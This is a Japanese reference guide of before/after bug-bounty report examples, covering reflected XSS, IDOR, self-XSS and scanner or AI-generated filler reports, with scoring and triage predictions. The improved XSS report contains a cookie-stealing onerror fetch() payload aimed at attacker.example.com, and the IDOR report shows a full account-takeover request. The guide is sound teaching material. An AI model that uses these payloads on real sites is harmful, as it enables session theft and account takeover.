# 良いレポート / 悪いレポート Before / After 実例

レビュー時に「直し方の具体例」を示すための参照集。各観点ごとの典型的な改善パターン。

---

## 例 1：Reflected XSS（Before → After）

### Before（悪い例）

```
Title: XSS in example.com

There is XSS in the search page of example.com. When you put a payload in
the search bar, it executes. This is critical because XSS can do many things
like cookie stealing.

Steps:
- Go to search page
- Put payload <script>alert(1)</script>
- See alert

Severity: Critical
```

**問題点**：
- タイトルが「XSS in example.com」で具体性ゼロ
- Description が「結局どこの何の処理か」を説明していない
- Steps に URL がない
- PoC が `alert(1)` だけで影響不明
- Impact が定型文（「cookie stealing」とだけ）
- Severity が「Critical」だけで CVSS なし、しかも Reflected XSS で Critical は過大
- 補助資料なし
- CWE / Remediation なし

**推定スコア：22 / 100（Major rewrite）**

### After（直したもの）

```markdown
# Reflected XSS in `q` parameter on /search allows session theft against any visitor

## Asset & Scope
- Target: `https://www.example.com/search`
- In-scope per program brief (Web app, `*.example.com`).

## Description
The `q` query parameter on `/search` is reflected into the HTML response
body without HTML-encoding (`<h1 class="result-title">{q}</h1>`), enabling
arbitrary script injection executed in the visitor's browser session under
the application's origin. No authentication is required to trigger or to
exploit, so the attack surface is any visitor of the search results page.

CWE-79: Improper Neutralization of Input During Web Page Generation
('Cross-site Scripting').

## Steps to Reproduce
1. Open the following URL in any modern browser:
   ```
   https://www.example.com/search?q=%22%3E%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27https%3A%2F%2Fattacker.example.com%2Fc%2F%27%2BencodeURIComponent(document.cookie))%22%3E
   ```
2. Observe that the `<img>` tag is injected into the DOM and the `onerror`
   handler fires automatically.
3. Verify on the attacker-controlled listener
   (`https://attacker.example.com/c/...`) that the visitor's session cookie
   has been received.

## Proof of Concept

Payload (URL-decoded):
```html
"><img src=x onerror="fetch('https://attacker.example.com/c/'+encodeURIComponent(document.cookie))">
```

Response excerpt (`view-source:` of the search results page):
```html
<h1 class="result-title">"><img src=x onerror="fetch(...)"</h1>
```

Video PoC: `xss-poc.mp4` (12s, no audio) — full flow from URL click to
attacker server receiving the cookie.

## Impact
This vulnerability enables an attacker to fully compromise the session of
any visitor who clicks an attacker-crafted URL on `www.example.com`.

Worst-case attack chain:
1. Attacker crafts a URL with the payload, distributes via phishing email,
   social media link, or compromised ad inventory.
2. Victim visits the URL; payload executes in the origin of `www.example.com`.
3. Session cookie (`session_id`, currently issued **without `HttpOnly`**) is
   exfiltrated.
4. Attacker hijacks the session: access to victim's order history, saved
   payment methods (last-4 + card holder name), and the ability to change
   the account email — leading to full account takeover.

Affected population: any unauthenticated or authenticated visitor reachable
via a crafted URL.

## Severity
**High** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` → 8.2

Justification: Network-reachable, no auth, requires user click (URL),
crosses session-origin boundary (`S:C`), full session compromise (`C:H`),
limited integrity (account changes via session, not direct data write).

## Remediation
- Root cause: the search handler in `app/views/search/results.html.erb`
  interpolates `q` directly without escaping. Use Rails' built-in HTML
  escaping (`<%= %>` instead of `<%== %>`), or call `ERB::Util.html_escape`
  explicitly.
- Defense-in-depth:
  - Set `HttpOnly` on the `session_id` cookie to make cookie theft via
    JavaScript impossible.
  - Add a CSP `default-src 'self'; script-src 'self'` to block external
    inline script execution.

## References
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- OWASP XSS Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
```

**改善ポイント**：
- タイトルがタイプ + 場所 + 影響を網羅
- Description で技術根拠が明確、CWE 言及あり
- Steps が完全な URL 付き、再現可能
- PoC で payload + response + 影響経路まで揃う
- Impact が対象アプリ固有（HttpOnly なし、保存決済、メアド変更チェーン）
- CVSS ベクトル + スコア + 根拠
- Remediation がスタック固有（Rails、ERB）
- References あり

**推定スコア：92 / 100（Submit-ready）**

---

## 例 2：IDOR（Before → After）

### Before

```
IDOR in API

I can change the email of other users.

Steps: PATCH /users/123 with email payload, it works.

Impact: Account takeover possible.
```

**問題点**：
- 認可境界が示されていない（どのアカウントから / どのアカウントへ）
- 完全な HTTP リクエストがない
- 2 つのアカウントを使った検証になっていない
- Impact が定型文、ユーザー数や管理者影響に言及なし
- CVSS、CWE、Remediation 全て欠如

**推定スコア：18 / 100（Do not submit）**

### After

```markdown
# IDOR on PATCH /api/v2/users/{id} lets any authenticated user change another user's email (full ATO)

## Asset & Scope
- Target: `https://api.example.com/v2/users/{id}` (PATCH)
- In-scope per program brief.

## Description
The `PATCH /api/v2/users/{id}` endpoint resolves the target user from the
URL path parameter without verifying that the authenticated session owns
that user ID. Any authenticated user can therefore modify arbitrary user
records — including administrative accounts — by changing the path ID.

CWE-639: Authorization Bypass Through User-Controlled Key

## Steps to Reproduce

**Prerequisites**
- Two test accounts:
  - Attacker: `attacker@evil.com` (user_id = 99001, registered via public signup)
  - Victim: `victim@example.com` (user_id = 99002, second test account)
- Burp Suite or any HTTP client.

**Reproduction**
1. Log in as `attacker@evil.com`. Capture the session cookie (`session=...`).
2. Send the request below, replacing `{victim_id}` with the victim's
   `user_id` (here `99002`):
   ```http
   PATCH /api/v2/users/99002/email HTTP/1.1
   Host: api.example.com
   Cookie: session=<attacker_session>
   Content-Type: application/json

   {"email":"pwned@evil.com"}
   ```
3. Observe `200 OK` with body:
   ```json
   {"id":99002,"email":"pwned@evil.com","updated_at":"2026-05-05T..."}
   ```
4. Log in as the victim (`victim@example.com`). The login fails because
   the email has changed; trigger the password reset flow on
   `pwned@evil.com` to take over the account.

## Proof of Concept
- Request / response logged in step 3 above.
- Screenshot `idor-200-response.png` showing the successful PATCH.
- Video `idor-poc.mp4` (45s) showing both accounts and the takeover flow.

## Impact
This IDOR allows **any authenticated user** of `app.example.com` to take
over arbitrary user accounts at scale.

Worst-case attack chain:
1. Attacker enumerates user IDs via the public listing
   `GET /api/v2/users?limit=100&offset=...` (sequential integer IDs).
2. For each victim, attacker calls the vulnerable endpoint to set the
   email to an attacker-controlled address.
3. Attacker triggers password reset → receives reset token → full
   account takeover.

Affected population:
- All ~1.2M registered users (per the public stats page on /about).
- Administrative accounts identified via ID range 1-100 (sequential).

Subsequent access on takeover:
- Stored payment methods (PAN last-4, cardholder name)
- Order history (PII: full name, address, phone)
- Internal-only admin panel for accounts in the admin ID range

Business impact:
- Account takeover at scale → reputational damage, GDPR notification
  obligation (PII exposure of EU customers).
- Admin compromise → fraudulent order manipulation, internal credential
  pivot.

## Severity
**High** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` → 8.1

## Remediation
- Root cause: the `users#update` controller resolves `User.find(params[:id])`
  without an authorization check. Add `authorize @user, :update?` (Pundit)
  or equivalent role/ownership check before any mutation.
- Restrict admin overrides to a separate explicit endpoint requiring an
  admin role check.
- Defense-in-depth:
  - Migrate to UUIDs for user IDs to limit enumeration.
  - Add an audit log entry for any email change (current logs show only
    success counts).

## References
- CWE-639: https://cwe.mitre.org/data/definitions/639.html
- OWASP API Security Top 10 — API1:2023 Broken Object Level Authorization
```

**推定スコア：93 / 100（Submit-ready）**

---

## 例 2.5：Impact セクションでの Attacker → Victim → System の書き方

同じ脆弱性（IDOR）でも、攻撃シナリオを 3 段で書くと説得力が大きく違う。

### Before（1 段で混在）

```
## Impact
An attacker can take over any account by changing the email and triggering
password reset. This affects all users.
```

→ Attacker / Victim / System が分離されておらず、トリアージャーが「実際にどうやってこれが起きるか」を再構築する必要がある。観点 7 で減点。

### After（3 段で分離）

```markdown
## Impact

### Attack Scenario (Attacker → Victim → System)

**1. Attacker preparation**
- The attacker registers a normal account on `app.example.com`
  (sign-up is open at `/signup`).
- The attacker enumerates user IDs via `GET /api/v2/users?limit=100`
  (returns sequential integer IDs, including admin range 1-100).
- No special infrastructure is required (no listener, no malicious site).

**2. Victim involvement**
- No victim action required. The exploitation is fully server-side
  from the attacker's authenticated session.
- Victim's session state, browser, or device are irrelevant.

**3. System outcome**
- The victim's email field is overwritten to an attacker-controlled
  address (HTTP 200 returned with the new email in response body).
- Subsequent password reset request → reset link delivered to attacker's
  inbox → attacker authenticates as the victim.
- For admin victims, this grants access to the internal admin panel
  including user management, financial reports, and audit logs.

### Business Impact
- ~1.2M registered users are exposed (per public stats page on /about).
- Admin compromise (IDs 1-100) leads to internal data manipulation
  capability.
- GDPR notification obligation likely triggered for EU customers'
  PII (full name, address, payment metadata) accessible after takeover.
- Reputational and contractual damage with enterprise customers.
```

→ トリアージャーは攻撃シナリオを再構築する必要がない。観点 7 で満点、観点 6（Impact）も対象アプリ固有のコンテキストで満点。

---

## 例 3：「報告非推奨」と判断すべきケース

### レポート

```
Title: Self-XSS in profile bio

I can put <script>alert(1)</script> in my own profile bio and when I view
my profile, it executes.

Impact: XSS allows attackers to steal cookies.

Severity: High
```

**判定**：
- Self-XSS は基本的に多くのプログラムで OOS（Bugcrowd VRT で N/A）
- 自分のセッションでしか発火しない → 攻撃者が他人を侵害する経路なし
- ビューアー側に蓄積されないなら Stored XSS でもない
- Impact が完全に定型文

**レビュー結果**：
- 総合スコア：12 / 100（Do not submit）
- 報告蓋然性：Unlikely
- 指摘：「Self-XSS のままでは多くのプログラムで Out-of-Scope。他ユーザーのブラウザでも実行される経路（共有プロフィール公開・URL 経由・モデレータ閲覧時など）を立証できない限り提出非推奨。プロフィールが公開ページであれば Stored XSS として再構成可能なので、まずそこを検証してください」と返す。

これを「綺麗にレポート整形すれば通る」と誤誘導しないこと。**脆弱性の本質的な評価**を伝えるのがプロのレビュー。

### この例での状態予測の出し方

```markdown
## TL;DR
- **総合スコア**: 12 / 100（Do not submit）
- **報告蓋然性**: Unlikely（自己 XSS は他者攻撃経路がない）
- **予測される処理結果**:
  - OOS 60%（自己 XSS は多くのプログラムで明示的に Out-of-Scope）
  - Informative 30%（プログラムによっては OOS ではなく Informative 判定）
  - N/A 10%（Self-XSS を「脆弱性ではない」と判定するプログラム）
  - **Accepted の可能性は 0%**
- **品質汚染**: なし
- **最重要の指摘 3 つ**:
  1. プロフィール bio が他ユーザーから閲覧可能か未検証。検証できなければ
     Stored XSS として成立しない
  2. 攻撃シナリオが Attacker → Victim → System で破綻（Victim = 自分）
  3. プログラム規約の Out-of-scope vulnerability types を再確認
```

---

## 例 4：品質汚染（スキャナ垂れ流し）— 提出禁止

### レポート

```
Title: Multiple Critical Vulnerabilities on app.example.com

I scanned app.example.com with Nuclei and found the following:

[CRITICAL] CVE-2023-12345 - Apache HTTP Server vulnerability
[HIGH]     CVE-2023-67890 - Outdated jQuery version
[HIGH]     CVE-2024-11111 - Possible XSS in /search endpoint
[MEDIUM]   Missing security headers (X-Frame-Options, CSP)

Severity: Critical
Impact: Multiple critical vulnerabilities allow attackers to compromise
the application.
```

**判定**：
- Nuclei 出力をそのままコピペ（観点 13 サイン 1, 3, 4 該当）
- 手動再現の証拠ゼロ
- 4 つの無関係な「脆弱性」を 1 レポートに同居
- バージョン情報のみで攻撃可能性が立証されていない
- Impact が完全テンプレ

**レビュー結果**：
- 総合スコア：8 / 100、**観点 13 が 0/10**
- 品質汚染：**重度**
- レディネス：**Do not submit**（観点 13 オーバーライド）
- 報告蓋然性：**Unlikely**

**指摘内容**：
- 「このまま提出すると HackerOne / Bugcrowd でスパム判定され、Reputation スコアが下がります（プライベートプログラム招待が来なくなる、最悪アカウント停止）」
- 「Nuclei は手がかり止まり。各 CVE について、(1) 実際にペイロードを送って (2) 発火を確認し、(3) 手動再現できたものを 1 件ずつ独立レポートとして提出してください」
- 「無関係な脆弱性を 1 レポートに同居させない」

---

## 例 5：品質汚染（AI 生成丸投げ）— 修正必須

### レポート

```
Title: Cross-Site Scripting Vulnerability in Web Application

## Description
This report details a critical Cross-Site Scripting (XSS) vulnerability
that has been identified in the web application. The vulnerability poses
a significant risk to the confidentiality, integrity, and availability
of the application and its users. Malicious actors could potentially
leverage this vulnerability to execute arbitrary JavaScript in the
context of the application, leading to severe consequences.

## Impact
The exploitation of this XSS vulnerability could result in unauthorized
access to sensitive user information, including but not limited to
session cookies, authentication tokens, and personal identifiable
information (PII). Furthermore, attackers may be able to perform
actions on behalf of legitimate users, which could lead to account
takeover scenarios, data manipulation, and reputational damage to the
organization. Additionally, this vulnerability may be leveraged in
combination with other attack vectors to escalate privileges and gain
further access to the system.

## Recommended Mitigation
To address this vulnerability, it is recommended to implement the
SafeInputValidator library (CWE-9999) which provides comprehensive
input sanitization and output encoding capabilities. Additionally,
security headers should be properly configured to prevent XSS attacks.
Regular security audits and penetration testing are also advised to
identify and remediate similar vulnerabilities in the future.
```

**判定（観点 13 検出サイン）**：
- ✅ サイン 1：過度に流暢で対象非依存の汎用文（「significant risk」「leverage」「compromise」が頻出）
- ✅ サイン 2：存在しない CWE（`CWE-9999`）と存在しないライブラリ（`SafeInputValidator`）
- ✅ サイン 4：同じ意味を別表現で繰り返す（Impact 段落）
- ✅ サイン 5：関係のない一般論（「Regular security audits and penetration testing are also advised」）
- ✅ サイン 7：対象アプリ名・実エンドポイント・実機能名の言及ゼロ
- 5 つ以上の検出サイン → **観点 13 は 2/10、重度の汚染**

**レビュー結果**：
- 総合スコア：18 / 100、**観点 13 が 2/10**
- 品質汚染：**重度**（AI 生成丸投げ）
- レディネス：**Do not submit**（観点 13 オーバーライド）

**指摘内容**：
- 「`CWE-9999` と `SafeInputValidator` は実在を確認できません（AI ハルシネーション）。CWE は MITRE 公式リストから、ライブラリは実在する DOMPurify / Bleach 等から選んでください」
- 「対象アプリの実エンドポイント・実機能名・実データ種別を全セクションに必ず含めてください。現状は『the application』『the user』のみで、どの脆弱性レポートにもそのまま貼れる汎用テキストになっています」
- 「AI を下書き支援として使うのは正常ですが、提出前に各セクションを自分の言葉で 30% 以上書き換え、対象アプリ固有のコンテキストを埋め込む工程が必須です」

---

## 例 6：状態予測の出し方（高品質レポート）

優れたレポートでも単に「Submit-ready」と返すのではなく、**確率分布で予測**する：

```markdown
## TL;DR
- **総合スコア**: 92 / 100（Submit-ready）
- **報告蓋然性**: Confident（PoC 動作、攻撃シナリオ論理的に成立）
- **予測される処理結果**:
  - Accepted 75%（高品質、攻撃シナリオ明確、PoC 動作）
  - Duplicate 15%（公開 Disclosed Reports に類似事例あり、要確認）
  - Informative 5%（Severity Cap で降格の可能性）
  - その他 5%
- **品質汚染**: なし
- **規約違反リスク**: なし
- **最重要の指摘 3 つ**: 微修正のみ
  1. CSP の `unsafe-inline` 検討の追記推奨
  2. Bugcrowd VRT カテゴリ「Sensitive Data Exposure」の併記
  3. 公開 Disclosed Reports での重複検索を提出前に実施
```

**ポイント**：
- 「Accepted 100%」とは言わない（プログラム判断は不確実）
- Duplicate のリスクは常に念頭に置く（特に公開 CVE / Disclosed Reports に類似する場合）
- Severity Cap の存在も明示する（プログラム規約による）

---

## 例 7：状態予測の出し方（OOS 該当）

```markdown
## TL;DR
- **総合スコア**: 55 / 100（Needs work）
- **報告蓋然性**: Likely（脆弱性自体は本物）
- **予測される処理結果**:
  - **OOS 75%**（プログラム規約で「Email enumeration」が明示的に OOS リストに含まれる可能性が極めて高い）
  - Informative 20%（プログラムによっては OOS でなく Informative）
  - Accepted 5%（チェーン化を構築できれば）
- **品質汚染**: なし
- **最重要の指摘 3 つ**:
  1. **対象プログラムの Out-of-scope リストを最優先で確認**。Email
     enumeration は業界標準で OOS が多い
  2. もし OOS なら、Email enumeration を起点とした他脆弱性へのチェーン
     （Account Takeover の前段階として）を構築できないか検討
  3. 単独報告するなら、競合への報告ではなく自社規約準拠を再確認
```
